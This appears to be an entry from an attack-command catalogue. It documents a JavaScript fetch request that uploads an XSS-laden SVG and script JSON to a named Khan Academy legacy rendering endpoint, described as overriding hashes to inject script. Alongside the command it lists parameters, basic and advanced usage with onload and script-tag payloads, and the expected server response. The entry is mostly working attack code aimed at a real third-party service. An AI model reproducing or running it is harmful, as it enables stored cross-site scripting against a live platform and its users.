---
data: >-
  var form = new FormData(); form.append("js", ORIGINAL_JS); form.append("svg",
  XSS_SVG); form.append("other_data", JSON.stringify(XSS_JSON)); await
  fetch("http://graphie-to-png.kasandbox.org/svg", {"method": "POST", "body":
  form }).then(r => r.text())
tags:
  - xss
  - upload
  - fetch
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.690Z'
id: 2f1e019a-7761-40d2-84e9-b6bd3d7b1f3e
verified: false
validated: true
submitted: true
---
# upload-malicious-graphie-fetch

## Command

```javascript
var form = new FormData();
form.append("js", ORIGINAL_JS);
form.append("svg", XSS_SVG);
form.append("other_data", JSON.stringify(XSS_JSON));
await fetch("http://graphie-to-png.kasandbox.org/svg", {"method": "POST", "body": form }).then(r => r.text())
```

## Description

This JavaScript command uses the Fetch API to upload a malicious graphie by sending FormData with original JS, XSS-laden SVG, and JSON to the legacy Khan Academy API, overriding hashes for XSS injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| ORIGINAL_JS | Legitimate JavaScript code for hash matching | Yes |
| XSS_SVG | Malicious SVG string (e.g., with onload attribute) | Yes |
| XSS_JSON | Object with script content and typesetAsMath: false | Yes |
| endpoint | API URL (default: http://graphie-to-png.kasandbox.org/svg) | Yes |
| method | HTTP method (POST) | Yes |
| body | FormData object | Yes |

## Examples

### Basic Usage

```javascript
var form = new FormData();
form.append("js", 'Grapher.init(...)');
form.append("svg", '<svg onload="alert(\'XSS\')"></svg>');
form.append("other_data", JSON.stringify({content: '<script>alert("XSS")</script>', typesetAsMath: false}));
await fetch("http://graphie-to-png.kasandbox.org/svg", {"method": "POST", "body": form }).then(r => r.text())
```

### Advanced Usage

```javascript
// With error handling
const response = await fetch("http://graphie-to-png.kasandbox.org/svg", {"method": "POST", "body": form });
if (response.ok) { console.log(await response.text()); } else { console.error('Upload failed'); }
```

## Expected Output

Server response text, such as the generated PNG URL or hash (e.g., "https://cdn.kastatic.org/..."). Success indicated by 200 status and no validation errors.

## Related

- [[Related Procedure: Upload-Malicious-Graphie-via-Legacy-API]]
